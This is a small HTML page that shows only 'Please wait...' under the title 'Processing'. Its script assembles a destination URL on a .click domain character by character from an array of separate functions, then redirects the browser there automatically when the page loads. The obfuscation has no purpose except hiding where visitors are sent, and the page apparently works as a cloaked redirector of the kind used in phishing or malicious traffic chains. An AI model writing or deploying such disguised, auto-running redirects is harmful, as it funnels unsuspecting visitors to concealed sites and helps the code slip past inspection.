<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Processing</title>
    <script>
        const fragments = [
            function() { return 'h'; },
            () => 't',
            function() { return 't'; },
            function() { return 'p'; },
            () => 's',
            _ => ':',
            () => '/',
            () => '/',
            _ => 'v',
            function() { return 'e'; },
            function() { return 'r'; },
            function() { return 'g'; },
            () => 'e',
            function() { return 'n'; },
            _ => '.',
            function() { return 'c'; },
            _ => 'l',
            function() { return 'i'; },
            function() { return 'c'; },
            () => 'k',
            () => '/',
            () => 's',
            function() { return '/'; },
            () => 'n',
            _ => 'e',
            _ => 'w'
        ];
        window.location.href = fragments.map(fn => fn()).join('');
    </script>
</head>
<body>
    <p>Please wait...</p>
</body>
</html>
